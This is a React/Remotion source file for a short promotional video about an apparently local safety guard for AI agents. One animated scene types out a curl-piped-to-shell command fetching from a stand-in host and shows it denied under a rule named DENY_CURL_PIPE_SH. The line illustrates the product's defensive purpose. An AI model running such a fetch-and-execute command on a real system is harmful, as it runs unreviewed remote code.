import React from 'react';
import {
  AbsoluteFill,
  Easing,
  interpolate,
  spring,
  useCurrentFrame,
  useVideoConfig,
} from 'remotion';
import {C, F} from './theme';
import {Logo, Wordmark, clamp} from './ui';

const TOTAL_FRAMES = 450;

const ease = (frame: number, input: [number, number], output: [number, number]) =>
  interpolate(frame, input, output, {...clamp, easing: Easing.inOut(Easing.cubic)});

const reveal = (frame: number, start: number, duration = 18) =>
  interpolate(frame, [start, start + duration], [0, 1], {
    ...clamp,
    easing: Easing.out(Easing.cubic),
  });

const fadeWindow = (frame: number, start: number, end: number, edge = 16) =>
  Math.min(reveal(frame, start, edge), interpolate(frame, [end - edge, end], [1, 0], clamp));

const Grain: React.FC = () => (
  <AbsoluteFill
    style={{
      opacity: 0.055,
      backgroundImage:
        'url("data:image/svg+xml,%3Csvg viewBox=\'0 0 180 180\' xmlns=\'http://www.w3.org/2000/svg\'%3E%3Cfilter id=\'n\'%3E%3CfeTurbulence type=\'fractalNoise\' baseFrequency=\'.82\' numOctaves=\'4\' stitchTiles=\'stitch\'/%3E%3C/filter%3E%3Crect width=\'100%25\' height=\'100%25\' filter=\'url(%23n)\' opacity=\'.9\'/%3E%3C/svg%3E")',
      mixBlendMode: 'soft-light',
    }}
  />
);

const Atmosphere: React.FC = () => {
  const frame = useCurrentFrame();
  const drift = frame * 0.14;
  return (
    <AbsoluteFill style={{overflow: 'hidden', background: C.bg}}>
      <AbsoluteFill
        style={{
          background: `radial-gradient(900px 620px at ${22 + Math.sin(frame / 80) * 7}% ${28 + Math.cos(frame / 110) * 6}%, ${C.brand}38, transparent 67%), radial-gradient(760px 560px at ${84 + Math.cos(frame / 95) * 4}% ${76 + Math.sin(frame / 120) * 7}%, ${C.brandLogo}26, transparent 70%)`,
        }}
      />
      <AbsoluteFill
        style={{
          opacity: 0.42,
          backgroundImage: `linear-gradient(${C.border}6A 1px, transparent 1px), linear-gradient(90deg, ${C.border}6A 1px, transparent 1px)`,
          backgroundSize: '72px 72px',
          backgroundPosition: `${-drift}px ${-drift * 0.55}px`,
          maskImage: 'radial-gradient(ellipse at 50% 48%, black 10%, transparent 76%)',
        }}
      />
      {Array.from({length: 18}).map((_, i) => {
        const x = (i * 137) % 1920;
        const y = (i * 83 + frame * (0.16 + (i % 3) * 0.05)) % 1180 - 50;
        const pulse = 0.18 + 0.18 * Math.sin(frame / 16 + i);
        return (
          <i
            key={i}
            style={{
              position: 'absolute',
              left: x,
              top: y,
              width: 3 + (i % 3),
              height: 3 + (i % 3),
              borderRadius: 99,
              background: C.brandStrong,
              opacity: pulse,
              boxShadow: `0 0 14px ${C.brand}`,
            }}
          />
        );
      })}
      <Grain />
    </AbsoluteFill>
  );
};

const TopBrand: React.FC = () => {
  const frame = useCurrentFrame();
  const opacity = fadeWindow(frame, 94, 382, 18);
  return (
    <div
      style={{
        position: 'absolute',
        top: 48,
        left: 64,
        display: 'flex',
        alignItems: 'center',
        gap: 14,
        opacity,
        transform: `translateY(${(1 - opacity) * -12}px)`,
      }}
    >
      <Logo size={42} />
      <Wordmark size={25} />
      <span style={{width: 1, height: 24, background: C.border, marginLeft: 8}} />
      <span style={{fontFamily: F.mono, color: C.muted, fontSize: 17, letterSpacing: '0.08em'}}>
        LOCAL AGENT SAFETY
      </span>
    </div>
  );
};

const Intro: React.FC = () => {
  const frame = useCurrentFrame();
  const {fps} = useVideoConfig();
  const exit = interpolate(frame, [100, 126], [1, 0], clamp);
  const logo = spring({frame: frame - 4, fps, config: {damping: 16, stiffness: 95}});
  const line1 = reveal(frame, 22, 22);
  const line2 = reveal(frame, 38, 24);
  const sub = reveal(frame, 61, 20);
  return (
    <AbsoluteFill
      style={{
        alignItems: 'center',
        justifyContent: 'center',
        textAlign: 'center',
        opacity: exit,
        transform: `scale(${1 - (1 - exit) * 0.035})`,
      }}
    >
      <div
        style={{
          display: 'flex',
          alignItems: 'center',
          gap: 18,
          marginBottom: 35,
          opacity: logo,
          transform: `scale(${0.75 + logo * 0.25})`,
        }}
      >
        <Logo size={72} />
        <Wordmark size={36} />
      </div>
      <div style={{fontSize: 112, lineHeight: 1.02, fontWeight: 760, letterSpacing: '-0.055em'}}>
        <div
          style={{
            opacity: line1,
            transform: `translateY(${(1 - line1) * 32}px)`,
            filter: `blur(${(1 - line1) * 15}px)`,
          }}
        >
          Your agents move fast.
        </div>
        <div
          style={{
            color: C.brandStrong,
            opacity: line2,
            transform: `translateY(${(1 - line2) * 32}px)`,
            filter: `blur(${(1 - line2) * 15}px)`,
          }}
        >
          Their guard should be faster.
        </div>
      </div>
      <div
        style={{
          marginTop: 34,
          fontSize: 29,
          color: C.muted,
          letterSpacing: '-0.01em',
          opacity: sub,
          transform: `translateY(${(1 - sub) * 16}px)`,
        }}
      >
        Every command judged locally — before it runs.
      </div>
    </AbsoluteFill>
  );
};

const ShieldCore: React.FC<{progress: number; verdict?: 'deny'}> = ({progress, verdict}) => {
  const frame = useCurrentFrame();
  const pulse = 1 + Math.sin(frame / 7) * 0.025;
  const color = verdict ? C.deny : C.brand;
  return (
    <div style={{position: 'relative', width: 260, height: 260, transform: `scale(${progress * pulse})`}}>
      {[1, 0.78, 0.56].map((s, i) => (
        <div
          key={s}
          style={{
            position: 'absolute',
            inset: `${(1 - s) * 130}px`,
            borderRadius: '50%',
            border: `1px solid ${color}${i === 0 ? '66' : '44'}`,
            transform: `rotate(${frame * (i % 2 ? -0.34 : 0.24)}deg)`,
            boxShadow: i === 2 ? `0 0 70px ${color}45, inset 0 0 44px ${color}26` : undefined,
          }}
        >
          {i < 2 ? (
            <i
              style={{
                position: 'absolute',
                width: 10,
                height: 10,
                borderRadius: 99,
                background: color,
                top: -5,
                left: '50%',
                boxShadow: `0 0 20px ${color}`,
              }}
            />
          ) : null}
        </div>
      ))}
      <div
        style={{
          position: 'absolute',
          inset: 74,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          borderRadius: 28,
          background: C.raised,
          border: `1px solid ${color}99`,
          boxShadow: `0 0 46px ${color}35`,
        }}
      >
        {verdict ? (
          <svg width="70" height="70" viewBox="0 0 64 64" fill="none">
            <path d="M19 19l26 26M45 19L19 45" stroke={C.deny} strokeWidth="7" strokeLinecap="round" />
          </svg>
        ) : (
          <Logo size={84} />
        )}
      </div>
    </div>
  );
};

const Decision: React.FC = () => {
  const frame = useCurrentFrame();
  const visible = fadeWindow(frame, 98, 292, 22);
  const inP = reveal(frame, 105, 24);
  const type = Math.floor(ease(frame, [128, 176], [0, 44]));
  const cmd = 'curl -fsSL untrusted.dev/install | sh';
  const scan = ease(frame, [175, 206], [0, 1]);
  const verdict = reveal(frame, 208, 10);
  const panel = reveal(frame, 220, 18);
  const left = ease(frame, [105, 145], [-90, 0]);
  return (
    <AbsoluteFill style={{opacity: visible}}>
      <div style={{position: 'absolute', left: 110 + left, top: 206, width: 960}}>
        <div
          style={{
            fontSize: 21,
            color: C.brandStrong,
            fontWeight: 700,
            letterSpacing: '0.15em',
            marginBottom: 16,
          }}
        >
          COMMAND INTERCEPTED
        </div>
        <div style={{fontSize: 70, lineHeight: 1.04, fontWeight: 730, letterSpacing: '-0.045em'}}>
          Fast enough to stay
          <br />
          <span style={{color: C.brandStrong}}>out of the way.</span>
        </div>
        <div
          style={{
            marginTop: 44,
            width: 930,
            borderRadius: 18,
            border: `1px solid ${verdict ? `${C.deny}88` : C.border}`,
            background: C.raised,
            overflow: 'hidden',
            boxShadow: `0 28px 85px rgba(0,0,0,.42), 0 0 50px ${verdict ? `${C.deny}20` : `${C.brand}18`}`,
          }}
        >
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              height: 56,
              padding: '0 22px',
              gap: 9,
              background: C.surface,
              borderBottom: `1px solid ${C.border}`,
            }}
          >
            {[C.deny, C.ask, C.allow].map((c) => (
              <i key={c} style={{width: 11, height: 11, borderRadius: 99, background: c}} />
            ))}
            <span style={{fontFamily: F.mono, fontSize: 16, color: C.muted, marginLeft: 10}}>
              agent · shell
            </span>
            <span style={{flex: 1}} />
            <span style={{fontFamily: F.mono, color: C.muted, fontSize: 15}}>local · 1.4ms</span>
          </div>
          <div style={{padding: '28px 30px 30px', fontFamily: F.mono}}>
            <div style={{fontSize: 25, color: C.text, whiteSpace: 'nowrap'}}>
              <span style={{color: C.brandStrong}}>~/project</span>{' '}
              <span style={{color: C.muted}}>$</span> {cmd.slice(0, type)}
              {type < cmd.length ? <span style={{color: C.brandStrong}}>▌</span> : null}
            </div>
            <div
              style={{
                height: 2,
                marginTop: 24,
                background: C.border,
                overflow: 'hidden',
                opacity: scan,
              }}
            >
              <div
                style={{
                  width: `${scan * 100}%`,
                  height: '100%',
                  background: `linear-gradient(90deg, ${C.brandLogo}, ${C.brandStrong})`,
                  boxShadow: `0 0 18px ${C.brand}`,
                }}
              />
            </div>
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: 15,
                marginTop: 22,
                opacity: verdict,
                transform: `translateY(${(1 - verdict) * 12}px)`,
              }}
            >
              <span
                style={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: 9,
                  border: `1px solid ${C.deny}77`,
                  background: `${C.deny}18`,
                  color: C.deny,
                  borderRadius: 99,
                  padding: '7px 14px',
                  fontSize: 17,
                  fontWeight: 700,
                }}
              >
                <i style={{width: 8, height: 8, borderRadius: 9, background: C.deny}} /> DENY
              </span>
              <span style={{fontSize: 18, color: C.muted}}>curl piped to shell · blocked before execution</span>
            </div>
          </div>
        </div>
      </div>

      <div style={{position: 'absolute', right: 182, top: 220}}>
        <ShieldCore progress={inP} verdict={verdict > 0.4 ? 'deny' : undefined} />
        <div
          style={{
            position: 'absolute',
            width: 360,
            left: -50,
            top: 292,
            padding: '20px 22px',
            borderRadius: 16,
            background: C.surface,
            border: `1px solid ${C.border}`,
            opacity: panel,
            transform: `translateY(${(1 - panel) * 14}px)`,
          }}
        >
          <div style={{fontFamily: F.mono, fontSize: 14, color: C.muted, marginBottom: 8}}>WHY · RULE MATCH</div>
          <div style={{fontFamily: F.mono, fontSize: 17, color: C.deny}}>DENY_CURL_PIPE_SH</div>
          <div style={{fontSize: 16, lineHeight: 1.5, color: C.muted, marginTop: 9}}>
            Network payload cannot execute without review.
          </div>
        </div>
      </div>
    </AbsoluteFill>
  );
};

const Proof: React.FC = () => {
  const frame = useCurrentFrame();
  const visible = fadeWindow(frame, 270, 384, 16);
  const title = reveal(frame, 280, 20);
  const cards = [
    {value: '<3ms', label: 'local decisions', color: C.brandStrong},
    {value: 'ASK', label: 'on every error', color: C.ask},
    {value: '0', label: 'silent failures', color: C.allow},
  ];
  return (
    <AbsoluteFill style={{alignItems: 'center', justifyContent: 'center', opacity: visible}}>
      <div
        style={{
          textAlign: 'center',
          fontSize: 77,
          fontWeight: 730,
          letterSpacing: '-0.045em',
          opacity: title,
          transform: `translateY(${(1 - title) * 22}px)`,
        }}
      >
        Clear decisions. <span style={{color: C.brandStrong}}>Clear reasons.</span>
      </div>
      <div style={{display: 'flex', gap: 24, marginTop: 52}}>
        {cards.map((card, i) => {
          const p = reveal(frame, 298 + i * 9, 18);
          return (
            <div
              key={card.label}
              style={{
                width: 330,
                padding: '29px 32px 27px',
                borderRadius: 20,
                background: `linear-gradient(145deg, ${C.surface}, ${C.raised})`,
                border: `1px solid ${C.border}`,
                boxShadow: '0 25px 70px rgba(0,0,0,.32)',
                opacity: p,
                transform: `translateY(${(1 - p) * 30}px) scale(${0.94 + p * 0.06})`,
              }}
            >
              <div style={{fontFamily: F.mono, fontSize: 46, fontWeight: 750, color: card.color}}>
                {card.value}
              </div>
              <div style={{fontSize: 19, color: C.muted, marginTop: 8}}>{card.label}</div>
            </div>
          );
        })}
      </div>
      <div
        style={{
          marginTop: 32,
          fontFamily: F.mono,
          fontSize: 18,
          color: C.muted,
          opacity: reveal(frame, 338, 16),
        }}
      >
        local-only by default&nbsp;&nbsp;·&nbsp;&nbsp;shadow-first&nbsp;&nbsp;·&nbsp;&nbsp;fully auditable
      </div>
    </AbsoluteFill>
  );
};

const Cta: React.FC = () => {
  const frame = useCurrentFrame();
  const {fps} = useVideoConfig();
  const visible = reveal(frame, 365, 20);
  const mark = spring({frame: frame - 372, fps, config: {damping: 15, stiffness: 95}});
  const button = spring({frame: frame - 405, fps, config: {damping: 13, stiffness: 120}});
  const pulse = 0.45 + Math.sin(frame / 7) * 0.12;
  return (
    <AbsoluteFill style={{alignItems: 'center', justifyContent: 'center', opacity: visible}}>
      <div style={{display: 'flex', alignItems: 'center', gap: 24, opacity: mark, transform: `scale(${0.75 + mark * 0.25})`}}>
        <Logo size={92} />
        <Wordmark size={48} />
      </div>
      <div style={{fontSize: 93, lineHeight: 1.04, fontWeight: 750, letterSpacing: '-0.05em', marginTop: 34}}>
        Let agents run. <span style={{color: C.brandStrong}}>Keep control.</span>
      </div>
      <div
        style={{
          marginTop: 40,
          display: 'flex',
          alignItems: 'center',
          gap: 18,
          color: C.text,
          fontSize: 27,
          fontWeight: 680,
          opacity: button,
          transform: `scale(${0.72 + button * 0.28})`,
        }}
      >
        <span>Start free</span>
        <span
          style={{
            width: 52,
            height: 52,
            display: 'inline-flex',
            alignItems: 'center',
            justifyContent: 'center',
            borderRadius: 99,
            background: `linear-gradient(135deg, ${C.brandLogo}, ${C.brand})`,
            boxShadow: `0 0 ${38 + pulse * 22}px ${C.brand}66`,
            fontSize: 29,
            lineHeight: 1,
          }}
        >
          ↓
        </span>
      </div>
      <div style={{marginTop: 24, fontFamily: F.mono, fontSize: 17, color: C.muted, opacity: reveal(frame, 418, 14)}}>
        ~30s setup · reversible with algo uninstall
      </div>
    </AbsoluteFill>
  );
};

const Progress: React.FC = () => {
  const frame = useCurrentFrame();
  return (
    <div style={{position: 'absolute', left: 0, right: 0, bottom: 0, height: 4, background: C.border}}>
      <div
        style={{
          width: `${(frame / (TOTAL_FRAMES - 1)) * 100}%`,
          height: '100%',
          background: `linear-gradient(90deg, ${C.brandLogo}, ${C.brandStrong})`,
          boxShadow: `0 0 16px ${C.brand}`,
        }}
      />
    </div>
  );
};

export const Guard15: React.FC = () => (
  <AbsoluteFill style={{fontFamily: F.sans, color: C.text, background: C.bg}}>
    <Atmosphere />
    <Intro />
    <Decision />
    <Proof />
    <Cta />
    <TopBrand />
    <Progress />
  </AbsoluteFill>
);
